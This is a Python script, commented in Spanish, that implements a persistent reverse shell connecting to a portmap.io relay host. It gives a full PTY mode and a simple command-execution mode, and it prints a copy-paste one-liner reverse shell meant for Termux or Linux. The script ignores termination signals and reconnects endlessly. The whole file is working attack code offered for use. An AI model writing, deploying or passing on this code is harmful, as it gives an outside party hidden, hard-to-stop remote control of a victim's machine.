#!/usr/bin/env python3

REVERSE SHELL ULTRA ESTABLE - PORTMAP.IO
Conecta a: Astrazam-37147.portmap.host:37147


import socket
import subprocess
import os
import sys
import time
import signal
import pty

# ===== CONFIGURACIÓN =====
HOST = "Astrazam-37147.portmap.host"  # Tu dominio de portmap
PORT = 37147                           # Puerto público de portmap
RECONNECT_DELAY = 3                    # Segundos entre reconexiones
# =========================

def ignore_signals():
    """Ignorar señales para que no mate el proceso"""
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    signal.signal(signal.SIGHUP, signal.SIG_IGN)

def get_shell():
    """Obtener shell correcto para el sistema"""
    if os.path.exists('/data/data/com.termux'):
        return "/data/data/com.termux/files/usr/bin/bash"
    elif os.path.exists('/bin/bash'):
        return "/bin/bash"
    else:
        return "/bin/sh"

def create_reverse_shell():
    """Crear conexión reverse shell con PTY"""
    ignore_signals()
    shell = get_shell()
    
    print(f"[+] Conectando a {HOST}:{PORT}")
    print(f"[+] Shell: {shell}")
    print("[+] Iniciando conexión...\n")
    
    while True:
        try:
            # Crear socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            
            # Conectar a portmap.io
            s.connect((HOST, PORT))
            s.settimeout(None)
            
            # Enviar banner
            banner = f"""
{'='*50}
🚀 SHELL CONECTADA VÍA PORTMAP.IO
{'='*50}
Host: {socket.gethostname()}
User: {os.getenv('USER', 'unknown')}
Hora: {time.strftime('%H:%M:%S')}
{'='*50}

📟 Shell lista. Escribe comandos:
            """
            s.sendall(banner.encode())
            
            # Crear PTY interactivo
            pid = os.fork()
            
            if pid == 0:  # Proceso hijo
                # Cerrar socket en hijo (se usa en padre)
                s.close()
                
                # Crear nuevo PTY
                os.setsid()
                
                # Abrir PTY maestro/esclavo
                master, slave = pty.openpty()
                
                # Configurar terminal
                os.dup2(slave, 0)
                os.dup2(slave, 1)
                os.dup2(slave, 2)
                
                # Variables de entorno
                os.environ['TERM'] = 'xterm-256color'
                os.environ['PS1'] = '\\[\\033[1;32m\\]rev-shell\\[\\033[0m\\]:\\w\\$ '
                
                # Ejecutar shell
                os.execl(shell, shell, "-i")
            
            else:  # Proceso padre
                # Redirigir socket al PTY
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                
                # Mantener proceso hijo
                try:
                    os.waitpid(pid, 0)
                except:
                    pass
                
                # Si llegamos aquí, shell terminó
                s.close()
                print(f"\n[-] Shell cerrada - Reconectando en {RECONNECT_DELAY}s...")
                time.sleep(RECONNECT_DELAY)
                
        except KeyboardInterrupt:
            print("\n[+] Interrumpido por usuario")
            sys.exit(0)
            
        except socket.timeout:
            print("[-] Timeout - Reintentando...")
            time.sleep(RECONNECT_DELAY)
            
        except ConnectionRefusedError:
            print("[-] Conexión rechazada - Verifica portmap.io")
            time.sleep(RECONNECT_DELAY * 2)
            
        except Exception as e:
            print(f"[-] Error: {e} - Reconectando...")
            time.sleep(RECONNECT_DELAY)

def simple_reverse_shell():
    """Versión simple sin PTY (más robusta)"""
    ignore_signals()
    
    print(f"[+] Versión simple - Conectando a {HOST}:{PORT}")
    
    while True:
        try:
            s = socket.socket()
            s.settimeout(10)
            s.connect((HOST, PORT))
            s.settimeout(None)
            
            print("[+] Conectado - Iniciando shell...")
            s.sendall(b"\n[+] Shell conectada - Escribe comandos:\n$ ")
            
            while True:
                try:
                    # Recibir comando
                    data = s.recv(1024).decode().strip()
                    
                    if not data:
                        break
                    
                    # Comandos especiales
                    if data.lower() in ["exit", "quit"]:
                        s.sendall(b"\n[!] Cerrando...\n")
                        break
                    
                    # Ejecutar comando
                    try:
                        proc = subprocess.Popen(
                            data,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE
                        )
                        
                        output, error = proc.communicate(timeout=30)
                        
                        # Enviar salida
                        if output:
                            s.sendall(output)
                        if error:
                            s.sendall(b"\n[ERROR]: " + error)
                            
                        s.sendall(b"\n$ ")
                        
                    except subprocess.TimeoutExpired:
                        s.sendall(b"\n[TIMEOUT] Comando tardando mucho\n$ ")
                        proc.kill()
                    except Exception as e:
                        s.sendall(f"\n[ERROR]: {str(e)[:100]}\n$ ".encode())
                
                except socket.timeout:
                    # Mantener conexión viva
                    s.sendall(b"\n[PING] Conexión activa\n$ ")
                    continue
                except:
                    break
            
            s.close()
            time.sleep(RECONNECT_DELAY)
            
        except KeyboardInterrupt:
            print("\n[+] Interrumpido")
            sys.exit(0)
        except Exception as e:
            print(f"[-] Error: {e} - Reconectando...")
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    # Mostrar banner
    print(f"""
{'='*60}
🔥 REVERSE SHELL - PORTMAP.IO
{'='*60}
🌍 URL: {HOST}:{PORT}
👤 Usuario: {os.getenv('USER', 'unknown')}
📱 Sistema: {'Termux/Android' if os.path.exists('/data/data/com.termux') else 'Linux'}
⏰ Hora: {time.strftime('%Y-%m-%d %H:%M:%S')}
{'='*60}
[1] Modo interactivo completo (PTY)
[2] Modo simple (más robusto)
[3] One-liner para copiar
{'='*60}
    """)
    
    try:
        choice = input("Selecciona opción (1/2/3): ").strip()
        
        if choice == "1":
            create_reverse_shell()
        elif choice == "2":
            simple_reverse_shell()
        elif choice == "3":
            oneliner = f'''python3 -c "import socket,os,time;h='{HOST}';p={PORT};exec('while 1: try: s=__import__(\\'socket\\').socket();s.connect((h,p));[os.dup2(s.fileno(),f) for f in (0,1,2)];os.system(\\'/bin/bash -i\\') except: time.sleep(3)')"'''
            print(f"\n📋 ONE-LINER PARA COPIAR:")
            print("-" * 60)
            print(oneliner)
            print("-" * 60)
            print("\nCopiado. Ejecuta en Termux.")
        else:
            print("[!] Opción inválida. Usando modo interactivo...")
            create_reverse_shell()
            
    except KeyboardInterrupt:
        print("\n\n[+] Saliendo...")
        sys.exit(0)
